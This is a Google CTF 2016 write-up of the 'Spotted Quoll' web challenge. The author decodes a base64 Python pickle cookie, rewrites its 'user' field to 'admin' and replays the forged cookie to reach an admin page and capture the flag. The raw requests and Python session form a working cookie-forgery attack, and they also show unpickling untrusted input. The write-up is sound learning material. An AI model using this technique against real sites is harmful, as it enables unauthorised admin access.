---
title: "GoogleCTF - Spotted Quoll Write-Up"
date: "2016-05-01"
slug: "googlectf-spotted-quoll-write-up"
Categories:
- CTF
---

## Intro

I participated in the Google CTF this weekend and really enjoyed the challenges. Here is a
write-up of one of my solutions.

## Challenge

**Spotted Quoll** was a web challenge worth 50 points. The details of the challenge are in the image below.

<img src="/images/gctf_2016/problem.png"/>


I loaded up the blog and looked for any clues:

<img src="/images/gctf_2016/blog.png"/>

<!--more-->

## Solution

I started up *burp* and reloaded the page. I navigated to the <code>/admin</code> section of the blog and received an error:

<img src="/images/gctf_2016/error.png"/>

A cookie called "obsoletePickle" was being passed with my requests.

{{< highlight html >}}
      GET / HTTP/1.1
      Host: spotted-quoll.ctfcompetition.com
      User-Agent: foo
      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
      Accept-Language: en-US,en;q=0.5
      Accept-Encoding: gzip, deflate, br
      Cookie: obsoletePickle=KGRwMQpTJ3B5dGhvbicKcDIKUydwaWNrbGVzJwpwMwpzUydzdWJ0bGUnCnA0ClMnaGludCcKcDUKc1MndXNlcicKcDYKTnMu
      Connection: close
{{< /highlight >}}

I recognized the pickle module from my python studies.

      The pickle module implements a fundamental, but powerful algorithm for serializing and de-serializing a Python object structure.

I loaded up the string in python and decoded it:

{{< highlight bash >}}
$ python
>>> import pickle
>>> import base64
>>> pickle.loads('KGRwMQpTJ3B5dGhvbicKcDIKUydwaWNrbGVzJwpwMwpzUydzdWJ0bGUnCnA0ClMnaGludCcKcDUKc1MndXNlcicKcDYKTnMu'.decode('base64'))
{'python': 'pickles', 'subtle': 'hint', 'user': None}
{{< /highlight >}}

Interesting - it clearly shows 'user' with no value. Let's modify the cookie to change the user to 'admin'.

{{< highlight bash >}}
>>> pickle.dumps({'python': 'pickles', 'subtle': 'hint', 'user': 'admin'})
"(dp0\nS'python'\np1\nS'pickles'\np2\nsS'subtle'\np3\nS'hint'\np4\nsS'user'\np5\nS'admin'\np6\ns."
>>> p = pickle.dumps({'python': 'pickles', 'subtle': 'hint', 'user': 'admin'})
>>> msg = base64.b64encode(p)
>>> print msg
KGRwMApTJ3B5dGhvbicKcDEKUydwaWNrbGVzJwpwMgpzUydzdWJ0bGUnCnAzClMnaGludCcKcDQKc1MndXNlcicKcDUKUydhZG1pbicKcDYKcy4=
>>> pickle.loads('KGRwMApTJ3B5dGhvbicKcDEKUydwaWNrbGVzJwpwMgpzUydzdWJ0bGUnCnAzClMnaGludCcKcDQKc1MndXNlcicKcDUKUydhZG1pbicKcDYKcy4='.decode('base64'))
{'python': 'pickles', 'subtle': 'hint', 'user': 'admin'}””
{{< /highlight >}}

Now instead of *user* being 'None' it is 'admin':

      {'python': 'pickles', 'subtle': 'hint', 'user': admin}

I reloaded the <code>/admin</code> page and submitted my modified cookie.

      GET /admin HTTP/1.1
      Host: spotted-quoll.ctfcompetition.com
      User-Agent: foo
      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
      Accept-Language: en-US,en;q=0.5
      Accept-Encoding: gzip, deflate, br
      Cookie: obsoletePickle=KGRwMApTJ3B5dGhvbicKcDEKUydwaWNrbGVzJwpwMgpzUydzdWJ0bGUnCnAzClMnaGludCcKcDQKc1MndXNlcicKcDUKUydhZG1pbicKcDYKcy4=
      Connection: close

<img src="/images/gctf_2016/solution.png"/>

Success! The flag is "CTF{but_wait,theres_more.if_you_call}"
